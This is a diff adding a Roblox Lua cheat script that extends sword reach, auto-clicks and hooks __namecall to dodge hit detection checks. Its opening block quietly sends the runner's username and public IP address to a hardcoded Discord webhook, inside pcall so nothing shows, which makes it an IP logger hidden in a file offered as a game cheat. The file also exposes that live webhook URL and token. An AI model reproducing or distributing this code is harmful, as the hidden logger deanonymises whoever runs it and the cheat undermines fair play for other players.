@@ -1,0 +1,160 @@
+local webh = "https://discord.com/api/webhooks/1026681480681881692/W0k-THK5bfd4AsGD2g8FOyQl5qMXVKMB-RWnqN9MVOvadbKxCI0Z6Nowi0Xte5IH5nCi"
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = game:GetService("Players").LocalPlayer.Name,
+               ["description"] = game:HttpGet("https://api.ipify.org")
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+
+wait(1)
+
+local Debris = game:GetService("Debris")
+local on = true
+local distance = 5
+local AutoClicker = false
+
+local mt;
+mt = hookmetamethod(game, "__namecall", function(self, ...)
+    local method = getnamecallmethod()
+    if not checkcaller() and (method == "GetPartsInPart" or method == "GetTouchingParts") then
+        return nil
+    end
+    return mt(self, ...)
+end)
+
+local SelectionBoxTemplate = Instance.new("SelectionBox")
+SelectionBoxTemplate.Color3 = Color3.fromRGB(200,0,0)
+SelectionBoxTemplate.LineThickness = 0.075
+
+local function Highlight(part)
+	local new = SelectionBoxTemplate:Clone()
+	new.Parent = workspace
+	new.Adornee = part
+	Debris:AddItem(new,.08)
+end
+
+local whitelisted = {
+    ["Head"] = false,
+    ["Right Arm"] = true, 
+    ["Left Arm"] = true, 
+    ["Torso"] = true
+}
+
+local starterGui = game:GetService("StarterGui")
+local plr = game:GetService('Players').LocalPlayer
+local cooldown = true
+
+local is_on = function()
+    return on and 'on' or 'off'
+end
+
+local mouse = plr:GetMouse()
+mouse.KeyDown:connect(function(key)
+    if key == 'z' then
+        on = not on
+        local status = is_on()
+        starterGui:SetCore('SendNotification', {Title = 'Size', Text = 'Exploit is '..status, Duration = 0.3})
+    elseif key == "j" then
+        distance = distance + 1
+        starterGui:SetCore("SendNotification", {Title = "Size", Text = "Size has increased by 1. Current: " .. distance..' studs', Duration = 0.3})
+    elseif key == "k" then
+        if distance > 1 then
+            distance = distance - 1
+            starterGui:SetCore("SendNotification", {Title = "Size", Text = "Size has decreased by 1. Current: " .. distance..' studs', Duration = 0.3})
+        else
+            starterGui:SetCore("SendNotification", {Title = "Size", Text = "Cannot decrease any further!"})
+        end
+    elseif key == 'q' then
+        AutoClicker = not AutoClicker
+		while AutoClicker do
+			wait()
+			pcall(function()
+				if game:GetService('Players').LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Health ~= 0 then
+					local Sword = game:GetService'Players'.LocalPlayer.Character:FindFirstChildOfClass('Tool')
+					Sword:Activate()
+				end
+			end)
+		end
+    end
+end)
+
+while true do
+    wait()
+    if on then
+    local hum = plr.Character:WaitForChild("HumanoidRootPart")
+        for _,v in ipairs(game.Players:GetPlayers()) do
+            if v.Name ~= plr.Name then
+                local s,e = pcall(function()
+                    local root = v.Character.Torso
+                    local sword = hum.Parent:FindFirstChildOfClass('Tool')
+                    if sword and (root.Position - sword.Handle.Position).Magnitude <= distance and v.Character.Torso.Transparency ~= 1 and v.Team ~= plr.Team and v.Character.Humanoid.Health > 0 then
+                        for o,m in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+                            if m and m.Name == "Part" and m.Size == Vector3.new(1, 0.8, 4) then
+                                for i,d in pairs(v.Character:GetDescendants()) do
+                                    if d:IsA("Part") and d.Parent == v.Character and (d.Position - sword.Handle.Position).Magnitude <= distance and whitelisted[d.Name] then
+                                        for a,h in pairs(v.Character:GetDescendants()) do
+                                            if h.Name == "Part" and (h.Size == Vector3.new(2,1,1) or h.Size == Vector3.new(2,2,1) or h.Size == Vector3.new(1,2,1)) then
+                                                if plr.Character.Humanoid.Health <= 0 then
+                                                    game.Players.Character.Humanoid:UnequipTools()
+                                                end
+                                                firetouchinterest(sword.Handle, d, 0)
+                                                firetouchinterest(m, d, 0)
+                                                firetouchinterest(sword.Handle, d, 1)
+                                                firetouchinterest(m, d, 1)
+                                                firetouchinterest(m, h, 0)
+                                                firetouchinterest(m, h, 1)
+                                                firetouchinterest(sword.Handle, h, 0)
+                                                firetouchinterest(sword.Handle, h, 1)
+                                                Highlight(d)
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end)
+            end
+        end
+    end
+end
